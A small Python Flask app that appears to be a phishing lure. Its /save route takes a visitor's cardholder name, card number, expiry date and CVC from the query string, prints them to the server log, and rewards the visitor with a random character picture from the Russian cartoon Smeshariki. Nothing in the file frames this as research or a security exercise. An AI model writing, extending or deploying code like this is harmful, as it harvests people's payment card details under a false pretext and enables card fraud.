import random
from flask import Flask, request, render_template

app = Flask(__name__)

characters = [
    {
        "name": "Крош",
        "image": "https://i.ytimg.com/vi/w0KzaBEK5ME/maxresdefault.jpg"
    },
    {
        "name": "Ежик",
        "image": "https://www.meme-arsenal.com/memes/cd4e693847c3990925b685294796ff63.jpg"
    },
    {
        "name": "Бараш",
        "image": "https://sites.google.com/site/smesarikiclass/_/rsrc/1463455184627/home/baras/0_87b3e_6448e645_M.png"
    },
    {
        "name": "Нюша",
        "image": "https://i.ytimg.com/vi/lK3xzYGej8w/maxresdefault.jpg"
    }
]

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save')
def save():

    character = random.choice(characters)

    name = request.args.get('name')
    number = request.args.get('number')
    date = request.args.get('date')
    cvc = request.args.get('cvc')

    print(name, number, date, cvc)

    return render_template('result.html', character=character)

app.run(debug=True)